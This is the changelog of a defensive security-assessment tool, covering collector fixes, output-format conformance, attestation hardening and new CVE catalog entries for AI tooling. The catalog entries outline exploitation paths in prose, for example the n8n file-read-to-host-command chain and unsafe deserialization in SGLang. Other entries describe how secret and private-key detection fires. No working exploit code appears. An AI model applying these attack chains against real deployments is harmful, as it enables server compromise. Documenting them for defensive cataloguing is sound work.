# Changelog

## 0.14.24 — 2026-05-28

`crypto-codebase` `hardcoded-key-material` now requires a complete PEM block — a `BEGIN … PRIVATE KEY` header, a base64 body, and a closing `END` marker — before it fires. A bare `BEGIN … PRIVATE KEY` marker carrying no key body is a *detection pattern*, not a leak: a redaction or DLP library's regex literal that matches the key header (to redact keys), or a documentation placeholder such as `privateKeyPem: "<elided>"`, no longer registers as embedded key material. An actual pasted private key still fires.

## 0.14.23 — 2026-05-27

`crypto-codebase` collector accuracy:
- `hardcoded-key-material` now fires on private-key blocks only. A public key or certificate embedded in source (a pinned release-signing public key, a BIMI trust anchor, an autoupdate verification key) is published by design and is no longer flagged as leaked key material — it was inflating crypto risk on repositories handling keys correctly.
- `vendored-pqc-no-provenance` now recognizes `MANIFEST.json` (the common vendor-tree provenance record holding upstream version, source, and license) as provenance, alongside the existing markers. A vendored post-quantum tree documented this way no longer reports as provenance-less.

`containers` collector now resolves `ARG`-interpolated base references. A digest pinned through an ARG default (`ARG BASE=image@sha256:…` then `FROM ${BASE}`) is recognized as digest-pinned, and a base reference whose interpolation can't be resolved from an in-file `ARG` default no longer raises `dockerfile-from-latest` — an unknown reference can't be proven to float on `:latest`. A resolved-but-undigested tag still fires `dockerfile-no-digest-pin`, and a literal unpinned or `:latest` image still fires.

## 0.14.22 — 2026-05-27

The `containers` collector no longer false-flags multi-stage build-stage references. A `FROM <stage>` line that refers to an earlier `FROM <image> AS <stage>` is an internal build-stage reference, not a registry image, so it needs no tag or digest — but it was raising `dockerfile-from-latest` and `dockerfile-no-digest-pin` on every normal multi-stage Dockerfile. Stage references are now exempt; real registry images (unpinned or `:latest`) still fire.

## 0.14.21 — 2026-05-27

The survey/meta skills `framework-gap-analysis`, `threat-modeling-methodology`, and `global-grc` now document why their `atlas_refs` / `attack_refs` are intentionally empty (they correlate or teach across other skills' technique mappings rather than owning a native TTP set), matching the "Frontmatter Scope" note the other meta skills already carry. A reader inspecting the frontmatter alone no longer sees zero technique coverage and assumes the skill maps to nothing.

## 0.14.20 — 2026-05-27

Skill content cleanup:
- `sector-telecom` no longer labels its analysis-procedure subsections with the CLI verb names that were removed in 0.13.0 (`govern`, `direct`, `look`, etc.) — the section headings are neutral procedural language now. Its reference to `cred-stores` is annotated as a playbook (not a skill, matching the convention three sibling skills already use), and its `last_threat_review` date is quoted consistently with every other skill.
- `threat-model-currency` no longer pins an outdated date literal in its body that contradicted the frontmatter — it references the frontmatter `last_threat_review` so the assertion can't desync.
- `pqc-first` no longer leaks the engine's internal phase numbering ("Phase 5 analyze") into operator-facing output prose.
- `email-security-anti-phishing` no longer cites an internal contributor rule by name in its threat-context narrative.

## 0.14.19 — 2026-05-27

Catalog data-integrity pass:
- The AI supply-chain CVE families ShadowMQ (`CVE-2025-23254`, `CVE-2025-30165`, `CVE-2024-50050`, `CVE-2025-60455`) and the Triton authentication-bypass pair (`CVE-2026-24206`, `CVE-2026-24207`) now carry their ATLAS mapping (`AML.T0049`, Exploit Public-Facing Application) — matching the sibling entries in the same families that were already mapped.
- The `active_exploitation: "theoretical"` status (a published PoC with no observed in-the-wild exploitation) is now an explicit entry in the RWEP active-exploitation ladder instead of falling through to the zero default.
- The `framework-control-gaps` catalog's declared entry count is corrected (it read 184 while the catalog held 192) and a validator gate now fails if the declared count ever drifts from the actual count again.
- The derived staleness index counts jurisdictions consistently with the README and the catalog-summaries index (GLOBAL included → 35), clearing a false "badge drift" staleness finding.

## 0.14.18 — 2026-05-27

`precondition_check_source` now reports accurate provenance. A precondition supplied in the submission is tagged `submission` (it was always `merged`, because the value was internally copied into the run options), and a precondition the engine auto-detected from the host is tagged `auto` (it was mislabeled `submission`). A genuine programmatic override that supplies the same precondition both ways is still `merged`. Precondition gating behavior is unchanged.

## 0.14.17 — 2026-05-27

New `recipes` verb. `exceptd recipes` lists the curated multi-skill workflows (use-case → ordered skill chain); `exceptd recipes <id>` expands one. These were previously reachable only by reading the catalog file.

`ask` now points at the right skill for domains covered by a skill rather than a playbook. A question about email authentication (DMARC/DKIM/SPF/BIMI), child safety / age gates, HIPAA / healthcare, or data-loss prevention surfaces the matching skill (`email-security-anti-phishing`, `age-gates-child-safety`, `sector-healthcare`, `dlp-gap-analysis`) instead of only a confident-looking but wrong playbook. A genuinely low-confidence match also notes that the topic may be skill-only.

## 0.14.16 — 2026-05-27

`collect` is dramatically faster on large repositories. The directory-walking collectors (`secrets`, `crypto-codebase`, `containers`, `citation-hygiene`) called `realpathSync` on every file for symlink-cycle detection and stat'd each file before reading it; the walk is now a single shared implementation that resolves real paths only for directories and symlinks and reads files without a pre-stat. On a 5000-file repository `collect secrets` drops from ~1.1s to ~0.18s (and `collect containers` from ~0.7s to ~0.02s), with identical results.

Cheap verbs start faster. The CVE catalog (~2.6 MB) was parsed at module load on every invocation; verbs that never analyze (`brief`, `plan`, `look`, `ask`, `lint`, `discover`) no longer pay that cost — the catalog is parsed lazily on the first run that needs it (a corrupt catalog still blocks a `run` cleanly).

`ask` routes a few more questions correctly: a CI/OIDC question (e.g. "my CI runner leaked an OIDC token") routes to `cicd-pipeline-compromise` instead of the supply-chain playbooks, and an "AI command and control" question routes to `ai-api`. Common two-letter English filler words ("do", "is", "to", …) no longer produce a spurious low-confidence match for nonsense questions.

Removed an always-empty `recipes` field from the CVE cross-reference result. Recipes are use-case curated, never CVE-keyed, so a per-CVE recipe lookup could never populate.

## 0.14.15 — 2026-05-27

Emitted CSAF 2.0 and SARIF 2.1.0 documents now pass strict schema/profile validation:
- Every CSAF vulnerability carries `notes` (CVE-keyed entries previously omitted it, failing the security-advisory profile's mandatory test).
- A clean run's `csaf_informational_advisory` no longer carries a `/vulnerabilities` array or a `/product_tree` (both are wrong for the informational profile) and now includes the required external `/document/references` entry.
- `tracking.version` equals the last `revision_history` number and uses the same versioning scheme as it (previously the version was the playbook semver while the revision number was the integer `1` — two violations: a version/revision mismatch and mixed versioning schemes).
- SARIF results with `kind: "informational"` (framework-gap findings) now use `level: "none"` instead of `"note"`; the SARIF spec requires `level: "none"` whenever `kind` is not `"fail"`, so strict validators and GitHub code scanning previously rejected those results.
- SARIF `artifactLocation.uri` values from a submission-supplied evidence location are normalized to forward slashes. A Windows operator passing a native backslash path previously produced URIs that violate the SARIF URI-reference requirement (the collector-derived locations were already normalized; submission-threaded ones were not).

## 0.14.14 — 2026-05-27

Attestation durability and verification:
- Attestations are now written atomically. The body and its Ed25519 `.sig` sidecar are written to fsync'd temporary files and placed together (the body via an atomic create that still detects a session-id collision, the sidecar alongside it), so a crash or out-of-space mid-write can no longer leave a truncated `attestation.json` or a body without its signature. A failed write also leaves no partial file at the slot.
- `attest verify` now flags a deleted `.sig` sidecar as tampering (exit 6) when a signature was expected — i.e. when a signing key is present or a sibling attestation in the same session is signed — instead of accepting it as a benign "unsigned" attestation (exit 0). This makes the default `attest verify` agree with `reattest`, which already refused. A genuinely unsigned attestation on a keyless host stays benign.
- A `run` now blocks (`blocked_by: "mutex"`) when a live concurrent process holds the run lock, rather than proceeding without the lock after losing the acquire race. Same-process reentrancy and filesystem quirks are unaffected.

## 0.14.13 — 2026-05-27

Security: a collector scanning a hostile repository no longer hangs on a crafted file. Three workflow/Dockerfile/manifest scanners (`library-author`, `cicd-pipeline-compromise`, `containers`) had a regex that backtracked catastrophically on a long whitespace line — a single planted file could wedge the scan for minutes. The regexes are fixed and a per-line length cap bounds any future regression.

Deeply-nested evidence is now rejected with an actionable message instead of crashing with an opaque "internal error". The submission canonicalizer (which runs on every `run` to compute the evidence hash) recursed without bound; it now refuses a submission nested beyond 200 levels.

`run --strict-preconditions` now fails (exit 1) when a `skip_phase` precondition is false. Previously such a run skipped the detect phase and exited 0, so a CI gate relying on the flag silently passed despite the detection never running.

Detection no longer silently loses or buries a result:
- A `signal_overrides` value that isn't a recognized result (e.g. `"maybe"`, a number) now surfaces a `signal_override_unrecognized` runtime error instead of being dropped as if the signal were never supplied.
- A `not_detected` / `clean` classification override is refused when it would bury a deterministic indicator hit (a deterministic hit is too strong to downgrade to "nothing found"); the run stays inconclusive with an explanatory error. Probabilistic hits remain overridable for the legitimate "I confirmed these are benign" workflow. A refused override is no longer reported as applied.

`run --all` / `run-all` now exits 7 (session-id collision) when a reused `--session-id` collides across the batch, matching the single-run behavior — previously a batch that persisted nothing exited 0 and reported success.

`watch --help` prints usage and exits instead of starting the blocking daemon and hanging the terminal; `collect --help` now prints its synopsis. The `--help` synopsis for the spawned verbs (`watch`, `watchlist`, `report`, `scan`, `dispatch`, `currency`, `validate-cves`, `validate-rfcs`) is filled in.

README corrects the `watch` / `watchlist` documentation (the one-shot aggregator with `--alerts` / `--org-scan` is `watchlist`; `watch` is the long-running daemon) and the `refresh --prefetch` description (it warms the cache by fetching, the opposite of the report-only `--no-network`).

## 0.14.12 — 2026-05-27

Structured-bundle accuracy:
- CSAF advisories no longer attribute exploitation to the CISA KEV catalog for a CVE that is confirmed-exploited but not actually in KEV — the "(CISA KEV)" parenthetical is now conditional on the CVE's KEV status.
- An empty-evidence run emits a `csaf_informational_advisory` instead of a `csaf_security_advisory` with an empty `vulnerabilities` array (Profile 4 expects vulnerabilities; the informational profile does not).
- SARIF `cve_match` results now carry a `locations` entry. Without it, GitHub Code Scanning silently dropped the highest-severity result class.
- SARIF and OpenVEX render "not assessed" for an unassessed blast radius instead of the literal "null" / "null/5".
- `ci --format csaf|sarif|openvex` emits a JSON array of the pure documents instead of an exceptd wrapper carrying a top-level `ok` key (which is invalid in all three formats). Each array element is now a conformant document.

External-source command hardening:
- `validate-rfcs` / `validate-cves` reject an unknown flag before doing any work, instead of silently defaulting to a live-network run that hangs on a typo'd flag.
- `cve` and `rfc` now return `ok:false` (not `ok:true`) when the citation fails to stand up — the envelope matched the exit code was already 2, but `ok` was inverted.
- `refresh`, `prefetch`, and the `scan`/`dispatch`/`currency`/`watchlist` verbs reject unknown flags instead of silently ignoring them; the latter four also emit a top-level `ok` in their `--json` output.
- `framework-gap` and `skill` honor `--json` on their missing-argument paths (structured error, not plain text), and `skill --json` no longer treats `--json` as the skill name.

`doctor`:
- `doctor --rfcs` counts the whole RFC catalog (including the CSAF/draft/ISO citation families it previously dropped) with a `by_prefix` breakdown, and its freshness fields read the real catalog file instead of a path that never existed.
- `doctor --fix` re-verifies signatures after generating a key and signing, so a successful bootstrap reports success (exit 0) rather than carrying the pre-fix "signatures failed" state through to a non-zero exit. It also refuses to generate a key when a fingerprint pin is present without the public key (a corrupted checkout) rather than producing an install that can never verify.
- `doctor --shipped-tarball` runs the tarball round-trip even when combined with another selective flag (it was silently skipped). `doctor --ai-config` reports a warning when its scan hits the file cap, rather than an unqualified clean pass on an incomplete walk.

Playbook validation hardening (enforcement for future drift; the shipped corpus is unaffected):
- `domain.attack_refs` are cross-referenced against the ATT&CK catalog (they were unchecked).
- An air-gap playbook with a network-sourced artifact lacking an `air_gap_alternative` is now rejected (the schema's air-gap conditional was never executed by the validator).
- Empty `detect.indicators` / `look.artifacts` are rejected; every playbook must map to at least one real TTP (cross-cutting analysis playbooks excepted). Dangling `false_positive_profile` indicator references and invalid `clock_starts` / `frameworks_in_scope` values now fail validation instead of passing as warnings.

RWEP factor validation accepts a numeric string consistently with the scorer (the two surfaces previously disagreed).

## 0.14.11 — 2026-05-27

Security: `reattest <session-id>` now validates the session-id before it is joined into a filesystem path, the same gate the other read verbs use. A `../`-bearing id previously escaped the attestation root — reading a forged attestation and writing a signed replay record outside the root. Such an id is now refused (exit 1) and nothing is written.

Air-gap is now honored on every external-source path that previously leaked. `watchlist --org-scan`, `refresh --network`, and `prefetch` all consulted the network even under `--air-gap` / `EXCEPTD_AIR_GAP=1`; each now refuses (or, for `prefetch`, runs report-only) instead of egressing.

The `sbom` collector no longer reports `lockfile-no-integrity` on every clean repository. It counted the npm lockfile's root entry — which legitimately has no integrity hash — as a missing-integrity dependency, so the indicator fired on any normal `package-lock.json`. It now counts only remote-tarball entries that lack integrity.

The `secrets` collector no longer fires on the published AWS documentation example key (`AKIAIOSFODNN7EXAMPLE`), and a text file skipped for exceeding the size limit is now surfaced in `collector_errors` instead of being dropped silently. Secret/citation/crypto findings now carry the exact line in their evidence locations, so SARIF points at the line rather than the file.

Cache-integrity refusals during `refresh` (sha256 mismatch, tampered or unindexed cache) now exit 4 — the documented "cache precondition failed" code — instead of the generic 1. `refresh --source ""` errors with the valid-source list instead of silently running every source; `cve "  "` (whitespace) is treated as a missing argument; `refresh --advisory "  "` gets the dedicated empty-advisory message. `refresh --help` documents exit 1 and the full meaning of exit 4.

Human-readable output gaps closed across several verbs:
- `run --all` / `run-all` print a per-playbook summary table instead of dumping the full JSON.
- `attest diff --against` renders the same one-screen summary the no-argument form already did, rather than raw JSON.
- A matched CVE renders `KEV=Y`/`KEV=N` (not the raw boolean); a deterministic indicator no longer prints `deterministic/deterministic`; a truncated remediation, an over-long fired-indicator list, and the `ci` framework-gap / jurisdiction-clock rollups now show how much was elided; a preflight warning that carries its text in `message` and a runtime warning that carries only context fields are now shown instead of `(no detail)` / a blank line.
- `framework-gap <framework> <scenario>` summary line counts only the queried framework's gaps, matching the per-framework body (it previously reported the all-frameworks total).
- `report executive` writes its progress notice to stderr so piped markdown is clean.
- The synopsis now describes `watchlist` (the one-shot forward-watch aggregator) and `watch` (the long-running daemon) correctly; the inverted deprecation arrow is gone. `cve`/`rfc` help states their exit-2 contract.

## 0.14.10 — 2026-05-27

`ci <playbook> --evidence -` no longer reports a false PASS when handed a flat submission. `run` accepts a flat submission (`{ "signal_overrides": {...} }`) and so do operators by habit; `ci` keyed the input by playbook id, found nothing under that key, and evaluated an empty submission — a detected finding came back PASS. A single-positional `ci` invocation now treats a flat (non-bundle-shaped) submission as belonging to that playbook, so `ci` and `run` agree. A real bundle keyed by playbook id is still routed per-key.

`ai-run <playbook> --no-stream --evidence -` now rejects a non-object submission (`null`, an array, a scalar) at the read boundary, matching `run`. Previously the no-stream path skipped the shape guard and ran a malformed submission as if it were empty, so an operator believed a bad payload had been evaluated.

The `ci` framework-gap rollup now carries the gap explanation. Each rollup entry's `why_insufficient` was always null because the rollup read a field that doesn't exist on a gap record; the text lives in `actual_gap`, which is now surfaced (alongside `required_control`).

A regulatory clock now starts on an engine-confirmed detection, not only on an agent-submitted classification. When indicators fire and the engine itself classifies the detect phase as `detected`, `--ack` starts the notification clock and computes the jurisdiction deadlines — previously the clock only moved if the submission also carried `detection_classification: "detected"`, so an engine-confirmed finding left every deadline stalled at `pending_clock_start_event`.

`framework-gap <framework> <scenario>` refuses an unknown framework instead of returning a zero-gap report that reads as "no gaps found." A typo or an untracked framework now errors with the list of frameworks the catalog covers; the documented short forms (`NIST-800-53`, `PCI-DSS-4.0`) and `all` continue to resolve.

## 0.14.9 — 2026-05-27

`refresh --advisory <id> --air-gap` now refuses (no network) instead of egressing. The `--air-gap` flag was parsed but dropped before the fetch, so an air-gapped advisory seed silently reached GHSA/OSV — an air-gap-guarantee violation. Both the flag and the `EXCEPTD_AIR_GAP=1` env now refuse identically.

`--tlp` is wired through. It stamps the emitted bundle's CSAF `document.distribution` marking (TLP 2.0), validates the label against `CLEAR | GREEN | AMBER | AMBER+STRICT | RED`, and is refused on info-only verbs — previously it was accepted but never applied (a silent no-op).

`refresh --advisory ""` errors instead of silently running a full refresh, and `refresh --help` now documents refresh's own exit-code scheme — notably that its exit 3 means "draft produced, review pending" (distinct from `exceptd run`'s exit 3, "ran but no evidence"), so scripts should branch on the `ok` field rather than `$?`.

## 0.14.8 — 2026-05-27

SARIF output now carries file locations. A run's `results[].locations` are populated from per-indicator evidence locations, so a secret or file finding points at the file — and the line, when known — that triggered it instead of shipping location-less, which GitHub code scanning and most SARIF viewers drop or attribute to the repository root. A submission may supply locations directly (`evidence_locations: { "<indicator-id>": ["path", { "uri": "path", "startLine": N }] }`), and the code-scope collectors emit them from their hit data, so `exceptd collect <pb> | exceptd run <pb> --format sarif` produces located findings.

## 0.14.7 — 2026-05-27

The deprecated-alias help is now honest about behavior. `scan`, `dispatch`, `currency`, `validate-cves`, and `validate-rfcs` still run their original (legacy orchestrator) implementation and emit that older output shape — they are not transparent aliases of the canonical verbs listed as their replacements, and the help no longer implies otherwise.

`attest diff --against <sid>` validates the comparison session-id with the same gate as the primary one, so a path-traversal or malformed value returns an explicit "invalid session-id" error instead of a misleading "no session dir found".

## 0.14.6 — 2026-05-27

`attest verify --require-signed` makes an unsigned or sidecar-stripped attestation a failure (exit 1) instead of accepting it as "unsigned, exit 0". An audit gate can now require a valid Ed25519 signature, closing the path where deleting the `.sig` downgraded a tampered attestation to a passing verify. Default `attest verify` stays lenient — an unsigned attestation is reported but not failed (the common keyless-CI case).

New `attest prune --all-older-than <ISO> [--dry-run]` garbage-collects attestation sessions older than a cutoff. One attestation is written per `run` with no prior cleanup, so the store grew unboundedly; `--dry-run` previews the deletions, and removal is confined to the resolved attestation roots.

## 0.14.5 — 2026-05-27

`reattest` no longer reports a false "drifted" on an unchanged session. It now replays the original recorded submission instead of a hardcoded empty one, so unchanged evidence reproduces its prior hash and only a genuine change in the evidence (or the way it canonicalizes) shows as drift. The `attest diff` path was already correct; this fixes the replay-based `reattest`/`attest diff <sid>` verb, which previously emitted "drifted" — and wrote that bogus verdict into the audit trail — on every unchanged session.

`exceptd discover --cwd <dir>` now scans the target directory instead of silently scanning the process working directory; a nonexistent or non-directory path errors cleanly rather than being ignored.

`collect` warns on stderr when any precondition fails — not only when the collector emits an empty submission — so a collector that gathers artifacts but fails a consent/ownership gate (such as `cicd-pipeline-compromise`) tells you up front that `run` will block at preflight.

`lint` distinguishes a required artifact that is present but intentionally uncaptured (e.g. a POSIX-mode probe a collector skips on Windows) from one that is absent, instead of advising you to add an artifact that is already there.

## 0.14.4 — 2026-05-27

Clearer errors. A case-only playbook typo — `run SECRETS` — now suggests the right id ("Did you mean: secrets?") instead of only printing the id-format rule. Input-validation errors (a bad `--scope`, malformed evidence) are reported plainly rather than dressed as an "internal error" with a file-a-bug pointer. `exceptd ask` now points a question that names a specific CVE or RFC at the direct resolver (`exceptd cve <id>` / `exceptd rfc <n>`). The malformed-CVE message reads accurately for a short year, not only a non-numeric tail, and the RFC resolver's documentation reflects that obsoleted/historic RFCs are now in the local index.

## 0.14.3 — 2026-05-27

The resolved-citation cache is now integrity-checked. Each cached record carries a content digest (covering its `resolved_at` timestamp) that is verified on read, and freshness is gated on that timestamp rather than the file's modification time. A cache file edited in place — flipping a rejected CVE to "published" — is rejected as tampered instead of trusted, and a touched file can no longer resurrect a stale verdict. This closes a path where a writable cache could launder a rejected or fabricated citation into a passing verdict (which feeds `collect citation-hygiene --resolve` and, in turn, attestations).

`exceptd cve` and `exceptd rfc` reject unknown flags instead of silently ignoring them — a mistyped `--json` no longer emits human text into a pipe that asked for JSON.

Malformed evidence is rejected at the boundary. A JSON `null`, array, or scalar piped to `run --evidence -` now returns "evidence must be a JSON object" instead of being silently accepted as an empty run or surfacing as an internal error.

`collect citation-hygiene --resolve` now flags a cited RFC number that resolves to nothing, matching how it already flags a fabricated CVE. `ci --max-rwep` rejects a non-numeric or negative cap instead of silently coercing it to 0 (which had quietly degenerated the gate to "block everything"). `run --format` notes on stderr when it overrides `--json`. `cve`, `rfc`, `collect`, `watch`, and `report` are now listed in `exceptd help`.

## 0.14.2 — 2026-05-27

`exceptd collect citation-hygiene --resolve` now resolves the cited CVEs the offline catalog can't confirm — once each, through the shared resolver cache — and flips their verdicts instead of parking them as inconclusive for an agent to chase: a rejected or disputed identifier becomes a hit, a well-formed identifier NVD doesn't know becomes fabricated, and a confirmed one clears. Honors `--air-gap` (catalog and cache only, no network).

The RFC index now includes obsoleted and historic RFCs (8888 entries, up from 7476). `exceptd rfc <number>` resolves a superseded RFC entirely offline — RFC 2616, for example, returns "Hypertext Transfer Protocol -- HTTP/1.1, obsoleted by RFC 7230–7235" — so confirming whether a cited RFC is still current no longer requires an IETF datatracker lookup.

## 0.14.1 — 2026-05-27

Two citation resolvers — `exceptd cve <id>` and `exceptd rfc <number>` — answer "is this CVE/RFC citation valid?" so an agent gets the answer from exceptd instead of researching each identifier against NVD or the IETF datatracker by hand. A fan-out of agents auditing a codebase previously re-researched the same citations independently; these resolvers do it once and cache the result for the rest.

`exceptd cve <id>` returns a structured status — published, rejected, disputed, fabricated, nonexistent, or unknown — alongside CVSS / KEV / product. It resolves offline-first: the curated catalog, then a resolved cache, then a single NVD lookup whose result is cached under `.cache/upstream/resolved/` (7-day TTL). The first lookup of an uncatalogued identifier serves every later agent and every offline run. NVD's authoritative `vulnStatus` and `cveTags` are now read — they were previously fetched and discarded — so a rejected or disputed CVE is flagged rather than treated as valid (the class that lets a withdrawn identifier sit cited in a codebase unnoticed). A non-canonical identifier such as `CVE-2024-XXXX` is caught as fabricated with no network call. Network is opt-out: `--air-gap`, `--no-network`, or `EXCEPTD_AIR_GAP=1` keep resolution offline-only and return `unknown` with a reason. Exit code 2 when a citation will not stand up.

`exceptd rfc <number>` resolves an RFC number to its title and status from the local index — the whole current RFC series, fully offline. `--check "<claimed title>"` reports whether a claimed title matches the real one (exit code 2 on mismatch), catching an RFC number cited under the wrong specification.

Catalog entries may now carry a structured `status` field (`published` / `rejected` / `disputed` / `withdrawn` / `reserved`), sourced from NVD `vulnStatus` / `cveTags` or OSV / GHSA `withdrawn`, replacing the prior free-text heuristic. The `citation-hygiene` playbook now routes its "needs external verification" guidance through `exceptd cve` / `exceptd rfc`.

## 0.14.0 — 2026-05-26

New playbook — `citation-hygiene`. Validates a codebase's own cited security references: it scans source, comments, and docs for CVE and RFC citations and flags fabricated CVE IDs (the non-numeric `CVE-2024-XXXX` form), catalog-rejected/disputed CVEs, and RFC number-vs-title mismatches. Well-formed CVE IDs absent from the curated catalog are routed to an inconclusive "needs external verification" result rather than a false clear or a false fabrication flag. Ships with a companion collector — `exceptd collect citation-hygiene | exceptd run citation-hygiene --evidence -`. The catalog now holds 24 playbooks.

Unknown flags are refused on every verb. Previously only `doctor` rejected an unrecognized flag; every other verb silently ignored it, so a typo like `--max-rweap 70` or `--fromat sarif` looked like it applied a cap or a format when it did nothing. Each verb now exits 1 with the accepted-flag list and a did-you-mean suggestion. A flag that is valid on another verb (e.g. `--csaf-status` on `brief`) still gets its tailored "that flag belongs on a run-class verb" guidance instead of a blanket refusal.

`exceptd run --format json` now emits the full run result. It previously discarded the result and printed a short "unknown format" stub with a success exit code. SARIF, CSAF, and OpenVEX bundles are now emitted as spec-conformant documents — the internal `ok` envelope key is no longer prepended, so strict validators (GitHub code-scanning SARIF upload, CSAF trusted-provider checks) accept the output. Passing several `--format` values prints a note to stderr pointing at `bundles_by_format` rather than silently dropping all but the first.

`exceptd collect <pb> | exceptd run <pb> --evidence -` works again. `collect` now emits JSON when its stdout is a pipe (the human summary is reserved for an interactive terminal), so the documented one-liner no longer feeds a prose summary into `run`.

`exceptd refresh --check-advisories` polls the primary-source advisory feeds as documented (report-only; emits `diffs[]`) instead of being silently ignored.

`skill --help` and `framework-gap --help` print usage instead of erroring.

`exceptd attest list --limit <n>` caps the inventory; the JSON envelope reports the unfiltered total alongside the shown count.

Code-scope collectors skip agent scratch (`.claude`) and linked git worktrees. A working tree holding detached worktree copies was scanned once per copy, inflating hash and secret counts with duplicates of the same files. The `library-author` collector now recognizes release-time SBOM generation, npm provenance, and sigstore/cosign signing, and `id-token: write` declared at job scope — so a well-run publisher no longer gets false "SBOM absent" or "no OIDC" findings from artifacts that are produced at release time.

Documentation: the `ci` exit-code contract (0–5), the `osv` refresh source, and the full `--format` vocabulary are corrected in `--help` and README; the deprecated-alias help no longer claims a one-time banner it does not emit, and `reattest` / `list-attestations` are documented as canonical short forms rather than deprecated aliases.

## 0.13.126 — 2026-05-26

CVE catalog — n8n Git-node RCE. Adds **CVE-2026-21877**, completing the n8n critical cluster. In versions ≥ 0.123.0 and < 1.121.3, an authenticated user abuses the Git node to write a file of a dangerous type to an arbitrary path, which is then executed — yielding remote code execution and full compromise of both self-hosted and Cloud instances (CWE-434 unrestricted upload chained to CWE-94; GitHub CNA CVSS v3.1 9.9). Fixed in 1.121.3. Reuses the AI-app-builder execution-endpoint auth-and-sandbox control (NEW-CTRL-103), which now also covers file-writing workflow nodes as code-execution sinks. CVE count 419 → 420.

## 0.13.125 — 2026-05-26

CVE catalog — SGLang unauthenticated IPC-deserialization RCE cluster. Adds two unauthenticated RCEs in SGLang (lmsys), the unauth siblings of the already-catalogued authenticated weight-update flaw. **CVE-2026-3059** (CNA CVSS v3.1 9.8) — the multimodal generation module's ZMQ broker deserializes untrusted serialized objects from unauthenticated peers (CWE-502). **CVE-2026-3060** (CNA CVSS v3.1 9.8) — the encoder-parallel disaggregation module does the same. Both yield unauthenticated remote code execution on the serving host and are fixed in 0.5.10 (PR #20904). Both reuse the AI-inference IPC deserialization-safety control (NEW-CTRL-086), shared with the vLLM ZeroMQ-transport and TensorRT-LLM deserialization class — the lesson being that inference-engine IPC channels must use a safe serializer + peer authentication and never deserialize untrusted objects. CVE count 417 → 419.

## 0.13.124 — 2026-05-26

CVE catalog — stable-diffusion-webui (AUTOMATIC1111). Adds **CVE-2024-31462** in the most widely deployed Stable Diffusion web UI. The Backup/Restore tab (`save_config_state` in `modules/ui_extensions.py`) builds a file path from an unvalidated user-supplied config-state name and opens it for writing, yielding a limited file write (JSON files to arbitrary locations) on Windows (CWE-22; GitHub CNA CVSS v3.1 6.3; GHSL-2024-010). The advisory tested 1.7.0, but the CVE/OSV record marks releases through 1.8.0 as affected — fixed by commit `d9708c92`, so upgrading 1.7.0 → 1.8.0 is **not** sufficient. Reuses the AI-runtime-API path-traversal validation control (NEW-CTRL-094). CVE count 416 → 417.

## 0.13.123 — 2026-05-26

CVE catalog — n8n AI-workflow / automation platform. Adds two flaws in n8n (joining the already-catalogued CVE-2025-68613 expression-injection RCE). **CVE-2026-21858** (GitHub CNA CVSS v3.1 10.0 CRITICAL) — versions 1.65.0 to before 1.121.0 let an unauthenticated attacker access files on the underlying server through form-based actions with no path confinement (CWE-20); fixed in 1.121.0. On locally deployed instances the public exploit chains the read into host RCE — read the DB/config, forge an admin session, then run host commands via the Execute Command node — so the entry maps command-execution and valid-accounts TTPs alongside the file read. Reuses the AI-runtime-API path-traversal validation control (NEW-CTRL-094). **CVE-2025-68668** (CVSS v3.1 9.9) — the Python Code Node's Pyodide sandbox is bypassable, so an authenticated workflow editor runs code with host privileges (CWE-693 protection-mechanism failure); fixed in 2.0.0. Reuses the AI-app-builder execution-endpoint auth-and-sandbox control (NEW-CTRL-103), shared with the Dify code-node escape and Langflow/Flowise RCEs. CVE count 414 → 416.

## 0.13.122 — 2026-05-26

CVE catalog — SGLang LLM-serving framework. Adds two RCEs in SGLang (lmsys), a widely used high-performance LLM serving / inference framework. **CVE-2025-10164** (VulDB CNA CVSS v3.1 7.3; GHSA describes it as RCE) — `update_weights_from_tensor` deserializes untrusted serialized-object tensor data, so a deployment that exposes the weight-update path to untrusted input executes arbitrary code (CWE-502 / CWE-20); reuses the untrusted-model-artifact loading control (NEW-CTRL-091). **CVE-2026-5760** (CNA CVSS v3.1 9.8 CRITICAL) — the `/v1/rerank` endpoint renders a model-supplied `tokenizer.chat_template` with a non-sandboxed `jinja2.Environment()`, so a malicious model file achieves remote code execution via server-side template injection (CWE-94); fix renders with `ImmutableSandboxedEnvironment`. Introduces NEW-CTRL-110: an LLM serving framework must render model-supplied templates in a sandboxed environment and treat third-party model files as untrusted. Both are malicious-model classes (ATLAS AML.T0010/AML.T0011). CVE count 412 → 414.

## 0.13.121 — 2026-05-26

CVE catalog — ONNX model-interchange path traversal. Adds **CVE-2025-51480** in ONNX, the de-facto open model-interchange format used across the ML ecosystem. `onnx.external_data_helper.save_external_data` does not confine the model-supplied `external_data` `location`, so processing a crafted ONNX model writes external-data tensors to an arbitrary path (`../` traversal or absolute), overwriting arbitrary files (CWE-22; NVD CVSS v3.1 8.8) — which in a model-load pipeline can escalate to code execution. Requires the victim to process the malicious model (UI:R), so it is modelled as a malicious-model / supply-chain class (ATLAS AML.T0010/AML.T0011, ATT&CK T1195.002). Fixed in 1.18.0. Reuses the AI-runtime-API path-traversal validation control (NEW-CTRL-094). CVE count 411 → 412.

## 0.13.120 — 2026-05-26

CVE catalog — LangChain JS serialization injection. Adds **CVE-2025-68665**, the JavaScript sibling of the already-catalogued Python-side CVE-2025-68664. LangChain JS's `toJSON()` (and `JSON.stringify` of LangChain objects) did not escape free-form data containing the internal `lc` marker key, so attacker-controlled data carrying that structure is rehydrated as a legitimate LangChain object on deserialization instead of staying plain data (CWE-502; GitHub CNA CVSS v3.1 8.6, scope-changed / NVD 9.1). Fixed in `@langchain/core` 0.3.80 / 1.1.8 and `langchain` 0.3.37 / 1.2.3. Reuses the LLM-output deserialization trust-zone control (NEW-CTRL-064) and AI-tool input-sanitization (NEW-CTRL-005). Scored conservatively below the Python sibling, which additionally carries suspected-exploitation and weaponization signals the JS variant lacks. CVE count 410 → 411.

## 0.13.119 — 2026-05-26

